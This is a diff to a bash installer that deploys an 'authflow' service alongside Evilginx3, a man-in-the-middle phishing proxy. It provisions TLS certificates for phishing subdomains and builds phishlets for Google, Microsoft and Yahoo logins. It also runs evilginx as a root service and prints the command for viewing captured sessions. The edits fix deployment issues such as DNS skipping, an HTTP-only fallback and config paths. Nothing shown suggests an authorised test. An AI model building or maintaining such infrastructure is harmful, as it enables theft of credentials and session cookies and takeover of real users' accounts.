@@ -52,6 +52,7 @@ warn() {
 # Argument parsing
 # ============================================================================
 parse_args() {
+    SKIP_DNS=false
     while [[ $# -gt 0 ]]; do
         case $1 in
             --domain)
@@ -77,6 +78,10 @@ parse_args() {
             --admin-pass)
                 ADMIN_PASS="$2"
                 shift 2
+                ;;
+            --skip-dns)
+                SKIP_DNS=true
+                shift
                 ;;
             --repo-source)
                 REPO_SOURCE="$2"
@@ -300,7 +305,7 @@ build_authflow() {
     go mod tidy
     go mod download
 
-    go build \
+    go build -buildvcs=false \
         -ldflags="-s -w -X main.Version=$(git describe --tags --always 2>/dev/null || echo 'dev')" \
         -o "$APP_BINARY" \
         ./cmd/authflow
@@ -361,12 +366,19 @@ provision_tls() {
     certbot certonly \
         --dns-cloudflare \
         --dns-cloudflare-credentials "$CF_CREDS_FILE" \
+        --dns-cloudflare-propagation-seconds 60 \
         --non-interactive \
         --agree-tos \
         --expand \
         --email "admin@$DOMAIN" \
         --no-eff-email \
         $domain_args
+
+    # Check if certbot succeeded
+    if [ $? -ne 0 ]; then
+        warn "Let's Encrypt failed, continuing with HTTP-only mode"
+        sed -i 's/https_port: 443/https_port: 0/' "$EVILGINX_DIR/config/config.yaml" 2>/dev/null || true
+    fi
 
     # Allow the authflow group to read certificates
     chgrp -R "$SERVICE_GROUP" /etc/letsencrypt/archive /etc/letsencrypt/live
@@ -486,13 +498,21 @@ configure_evilginx_integration() {
     pkill evilginx 2>/dev/null || true
     sleep 2
 
-    # Create certificates directory and symlinks
-    mkdir -p "$EVILGINX_DIR/certs"
+    # Create proper directory structure for Evilginx
+    mkdir -p "$EVILGINX_DIR"/{config,certs,lures,phishlets}
+
+    # Base domain certificates
     ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/$DOMAIN.crt"
     ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/$DOMAIN.key"
 
-    # Create config.yaml for evilginx
-    cat > "$EVILGINX_DIR/config.yaml" << EOF
+    # Create certificate symlinks for each phishlet subdomain
+    for sub in $EP1 $EP2 $EP3; do
+        ln -sf "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.crt"
+        ln -sf "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/${sub}.${DOMAIN}.key"
+    done
+    
+    # Create config.yaml in the config subdirectory
+    cat > "$EVILGINX_DIR/config/config.yaml" << EOF
 daemon: false
 debug: true
 domain: $DOMAIN
@@ -509,20 +529,17 @@ EOF
     # Ensure phishlets directory exists
     mkdir -p "$EVILGINX_DIR/phishlets"
 
-    # Copy and process phishlet templates
-    local DOMAIN_B64=$(echo -n "$DOMAIN" | base64 | tr -d '\n')
+    # Replace variables in phishlets
     for phishlet in google microsoft yahoo; do
         if [ -f "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" ]; then
-            cat "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" | \
-                sed "s/{{.Endpoint1}}/$EP1/g" | \
-                sed "s/{{.Endpoint2}}/$EP2/g" | \
-                sed "s/{{.Endpoint3}}/$EP3/g" | \
-                sed "s/{{.Domain}}/$DOMAIN/g" | \
-                sed "s/{{.DomainBase64}}/$DOMAIN_B64/g" | \
-                sed "s/{{.VpsIp}}/$VPS_IP/g" | \
-                sed "s/{{.AppPort}}/$APP_PORT/g" | \
-                sed "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
-                > "$EVILGINX_DIR/phishlets/${phishlet}.yaml"
+            sed -e "s|{{.Endpoint1}}|$EP1|g" \
+                -e "s|{{.Endpoint2}}|$EP2|g" \
+                -e "s|{{.Endpoint3}}|$EP3|g" \
+                -e "s|{{.Domain}}|$DOMAIN|g" \
+                -e "s|{{.VpsIp}}|$VPS_IP|g" \
+                -e "s|{{.AppPort}}|$APP_PORT|g" \
+                -e "s|{{.WebhookSecret}}|$WEBHOOK_SECRET|g" \
+                "$INSTALL_DIR/templates/phishlets/${phishlet}.yaml.tmpl" > "$EVILGINX_DIR/phishlets/${phishlet}.yaml"
             log "Created phishlet: $phishlet"
         else
             warn "Phishlet template not found: ${phishlet}.yaml.tmpl"
@@ -542,7 +559,7 @@ Type=simple
 User=root
 WorkingDirectory=$EVILGINX_DIR
 ExecStartPre=/bin/rm -f $EVILGINX_DIR/evilginx.db
-ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml -p $EVILGINX_DIR/phishlets
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config -p $EVILGINX_DIR/phishlets
 Restart=always
 RestartSec=5
 StandardOutput=journal
@@ -555,7 +572,8 @@ WantedBy=multi-user.target
 EOF
 
     systemctl daemon-reload
-    systemctl enable evilginx
+    # Don't enable evilginx service automatically
+    # systemctl enable evilginx
     
     # Start evilginx
     systemctl start evilginx
@@ -606,7 +624,7 @@ print_summary() {
     echo "  Logs: journalctl -u $SERVICE_NAME -f"
     echo ""
     echo "Evilginx3 Commands:"
-    echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR -p $EVILGINX_DIR/phishlets"
+    echo "  Manual Run: sudo evilginx -c $EVILGINX_DIR/config -p $EVILGINX_DIR/phishlets"
     echo "  Logs:       journalctl -u evilginx -f"
     echo "  Sessions:   sudo evilginx -c $EVILGINX_DIR sessions"
     echo ""
@@ -632,7 +650,11 @@ main() {
 
     parse_args "$@"
     validate_config
-    update_dns
+    if [ "$SKIP_DNS" = false ] && [ "$CLOUDFLARE_TOKEN" != "SKIP_DNS" ] && [[ "$CLOUDFLARE_TOKEN" != cf_* ]]; then
+        update_dns
+    else
+        log "Skipping DNS update (manual DNS configuration assumed)"
+    fi
 
     preflight_checks
     setup_system_user
